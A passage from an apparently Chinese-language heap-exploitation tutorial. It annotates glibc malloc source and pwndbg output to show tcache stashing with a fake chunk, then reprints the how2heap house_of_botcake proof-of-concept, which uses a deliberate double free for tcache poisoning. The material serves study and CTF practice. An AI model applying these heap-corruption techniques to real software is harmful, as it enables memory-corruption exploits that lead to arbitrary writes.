
```C
//如果申请的大小在small bin范围内
//首先检查small bin
//其实我们这里直接跳出去了，因为small bin是空的
if (in_smallbin_range (nb))
{
//获取索引
idx = smallbin_index (nb);
//获取链表头
bin = bin_at (av, idx);
//如果链表尾等于链表头，说明链表为空。
//这里是如果不等于链表头
if ((victim = last (bin)) != bin)
{
//取出倒数第二个chunk
bck = victim->bk;
//检查BK的fd指针是否指向链表尾
if (__glibc_unlikely (bck->fd != victim))
malloc_printerr ("malloc(): smallbin double linked list corrupted");
set_inuse_bit_at_offset (victim, nb);
//BK当作最后链表尾
bin->bk = bck;
bck->fd = bin;
if (av != &main_arena)
set_non_main_arena (victim);
check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
/* While we're here, if we see other chunks of the same size,
stash them in the tcache. */
//这里跳过了
//...
#endif
void *p = chunk2mem (victim);
alloc_perturb (p, bytes);
return p;
}
}
#if USE_TCACHE
INTERNAL_SIZE_T tcache_nb = 0;
size_t tc_idx = csize2tidx (nb);
if (tcache && tc_idx < mp_.tcache_bins)
tcache_nb = nb;
int return_cached = 0;
tcache_unsorted_count = 0;
#endif
//从unsorted
for (;; )
{
int iters = 0;
//通过bk指针从尾部遍历unsorted bin，只剩头结点的时候结束
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
{
bck = victim->bk;
size = chunksize (victim);
mchunkptr next = chunk_at_offset (victim, size);
if (__glibc_unlikely (size <= CHUNK_HDR_SZ) || __glibc_unlikely (size > av->system_mem))
malloc_printerr ("malloc(): invalid size (unsorted)");
if (__glibc_unlikely (chunksize_nomask (next) < CHUNK_HDR_SZ) || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
malloc_printerr ("malloc(): invalid next size (unsorted)");
if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
if (__glibc_unlikely (bck->fd != victim)|| __glibc_unlikely (victim->fd != unsorted_chunks (av)))
malloc_printerr ("malloc(): unsorted double linked list corrupted");
if (__glibc_unlikely (prev_inuse (next)))
malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
/* remove from unsorted list */
//检查BK的fd指针是否指向链表尾
if (__glibc_unlikely (bck->fd != victim))
malloc_printerr ("malloc(): corrupted unsorted chunks 3");
//BK作为链表尾，因为尾部chunk被取走了
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
/* place chunk in bin */
//取出unsorted bin中的chunk放入small bin
if (in_smallbin_range (size))
{
//获取索引
victim_index = smallbin_index (size);
//头插法
bck = bin_at (av, victim_index);
fwd = bck->fd;
}
```

接下来两个`malloc(0x80)`从tcache bin中取出两个chunk，制造空位。

```
pwndbg> bins
top: 0x555555757940 (size : 0x206c0)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x0
(0x090) smallbin[ 7]: 0x5555557573b0 <--> 0x555555757290
(0x90) tcache_entry[7](5): 0x555555757690 --> 0x555555757600 --> 0x555555757570 --> 0x5555557574e0 --> 0x555555757450
```

![](upload/attach/202204/882497_ZAR468V9DYUW2NV.png)

这时候把`x[2]`的`bk`指针修改为`fake_chunk`，将`fake_chunk`也链入small bin，作为链表头。

注意`bk`指针的位置存的也是一个chunk结构体（的地址），详见上一节文章。

![](upload/attach/202204/882497_WB3CWAWGUFW9S3R.png)

原本`x[2]`的`bk`指针应指向链表头，如下图所示：

![](upload/attach/202204/882497_WUD76FYQ857AM2T.png)

修改`bk`指针后，如下图所示：

![](upload/attach/202204/882497_USMAAXJSVZE4TV2.png)

fakechunk：

![](upload/attach/202204/882497_CX6YMR69KAUAQ9N.png)

然后`calloc`一个`0x80`大小的chunk。`calloc`会直接调用`int_malloc`函数，而不是`tcache_get`函数。即如果对应大小的small bin不为空，会首先从small bins中取chunk。

这是`calloc`：

![](upload/attach/202204/882497_JCNYZNKER2Q77PS.png)

这是`malloc`：

![](upload/attach/202204/882497_TQ8CK4PQ5CJU5CF.png)

small bin的这条链这时有三个chunk，`x[0]`，`x[2]`和`fake_chunk`。从链表尾部取走`x[0]`后，发现对应tcache bin还有两个空位，所以就会把`x[2]`和`fake_chunk`链入tcache bin。

```C
//看当前small bin是否有剩余chunk，当前tcache bin是否满了
//如果small bin有剩余，tcache bin没满，就把small bin中剩余的chunk链入tcache bin
size_t tc_idx = csize2tidx (nb);
if (tcache && tc_idx < mp_.tcache_bins)
{
mchunkptr tc_victim;
/* While bin not empty and tcache not full, copy chunks over. */
while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin)
{
if (tc_victim != 0)
{
//通过bk指针从尾部遍历small bin
bck = tc_victim->bk;
//设置inuse位为1。因为tcache bin中的inuse位都是1，并没有经过修改
set_inuse_bit_at_offset (tc_victim, nb);
if (av != &main_arena)
set_non_main_arena (tc_victim);
//把BK设置成small bin的链表尾。
//原本他是倒数第二个，现在链表尾的chunk被取走放入tcache了
bin->bk = bck;
bck->fd = bin;
tcache_put (tc_victim, tc_idx);
}
}
}
```

然后再看下tcache bin，链表头已经存入`fake_chunk`。这时候再`malloc`就会将`fake_chunk`取出。

```
pwndbg> bins
top: 0x555555757940 (size : 0x206c0)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x0
(0x090) smallbin[ 7]: 0x5555557573b0 (invaild memory)
(0x90) tcache_entry[7](7): 0x7fffffffda60 --> 0x5555557573c0 --> 0x555555757690 --> 0x555555757600 --> 0x555555757570 --> 0x5555557574e0 --> 0x555555757450
pwndbg> n
pwndbg> bins
top: 0x555555757940 (size : 0x206c0)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x0
(0x090) smallbin[7]: 0x5555557573b0 (invaild memory)
(0x90) tcache_entry[7](6): 0x5555557573c0 --> 0x555555757690 --> 0x555555757600 --> 0x555555757570 --> 0x5555557574e0 --> 0x555555757450
```

## house_of_botcake_glibc2.34

### 原理

House of botcake的原理很简单。令chunk存在于两个bin中，即double free。利用overlap chunk可以修改tcache bin中double free chunk的`fd`指针，这样再次申请`malloc`的时候就会申请到目标地址。

### POC

how2heap源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
int main()
{
/*
* This attack should bypass the restriction introduced in
* https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
* If the libc does not include the restriction, you can simply double free the victim and do a
* simple tcache poisoning
* And thanks to @anton00b and @subwire for the weird name of this technique */
// disable buffering so _IO_FILE does not interfere with our heap
setbuf(stdin, NULL);
setbuf(stdout, NULL);
// introduction
puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
puts("returning a pointer to an arbitrary location (in this demo, the stack).");
puts("This attack only relies on double free.\n");
// prepare the target
intptr_t stack_var[4];
puts("The address we want malloc() to return, namely,");
printf("the target address is %p.\n\n", stack_var);
// prepare heap layout
puts("Preparing heap layout");
puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
intptr_t *x[7];
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
x[i] = malloc(0x100);
}
intptr_t *prev = malloc(0x100);
printf("Allocating a chunk for later consolidation: prev @ %p\n", prev);
intptr_t *a = malloc(0x100);
printf("Allocating the victim chunk: a @ %p\n", a);
puts("Allocating a padding to prevent consolidation.\n");
malloc(0x10);
// cause chunk overlapping
puts("Now we are able to cause chunk overlapping");
puts("Step 1: fill up tcache list");
for(int i=0; i<7; i++){
free(x[i]);
}
puts("Step 2: free the victim chunk so it will be added to unsorted bin");
free(a);
puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
free(prev);
puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
malloc(0x100);
/*VULNERABILITY*/
free(a);// a is already freed
/*VULNERABILITY*/
puts("Now we have the chunk overlapping primitive:");
int prev_size = prev[-1] & 0xff0;
int a_size = a[-1] & 0xff0;
printf("prev @ %p, size: %#x, end @ %p\n", prev, prev_size, (void *)prev+prev_size);
printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
a = malloc(0x100);
memset(a, 0, 0x100);
prev[0x110/sizeof(intptr_t)] = 0x41414141;
assert(a[0] == 0x41414141);
return 0;
}
```

简化版本
